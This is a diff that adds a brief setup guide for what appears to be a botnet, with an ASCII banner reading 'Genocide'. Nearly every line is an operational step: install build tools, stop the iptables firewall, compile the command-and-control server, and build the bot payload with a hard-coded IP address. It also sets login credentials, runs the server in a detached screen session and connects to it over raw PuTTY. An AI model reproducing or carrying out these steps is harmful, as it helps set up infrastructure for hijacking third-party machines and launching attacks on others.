@@ -1,0 +1,37 @@
+Edit the bot_snoopy.c file							 
+
+yum install python-paramiko nano screen gcc perl wget lbzip unzip -y
+
+service httpd restart 
+service iptables stop
+
+gcc cnc.c -o server -pthread
+
+python snoopy.py bot_snoopy.c 107.175.127.112
+
+echo RY RY >>User_Info.txt
+USERNAME SHOULD BE SAME AMOUNT OF LETTERS AS THE PASS(USERNAME HAS TO BE LONGER THEN PASS/SAME)!!!
+EX.
+
+USER = RYGOAT PASS = RYANGG
+       123456        123456
+screen ./server 839 1 1
+                EX. 839    EX. 8899
+
+NOW PRESS CRTL A+D
+
+LOGIN WITH PUTTY RAW PORT = SCREENPORT
+
+
+
+
+
+
+█████████                                         ███      █████
+  ███░░░░███                                        ░░░      ░░███
+ ███     ░░░   ██████  ████████    ██████   ██████  ████   ███████   ██████ 
+░███          ███░░███░░███░░███  ███░░███ ███░░███░░███  ███░░███  ███░░███
+░███    █████░███████  ░███ ░███ ░███ ░███░███ ░░░  ░███ ░███ ░███ ░███████ 
+░░███  ░░███ ░███░░░   ░███ ░███ ░███ ░███░███  ███ ░███ ░███ ░███ ░███░░░
+ ░░█████████ ░░██████  ████ █████░░██████ ░░██████  █████░░████████░░██████ 
+  ░░░░░░░░░   ░░░░░░  ░░░░ ░░░░░  ░░░░░░   ░░░░░░  ░░░░░  ░░░░░░░░  ░░░░░░
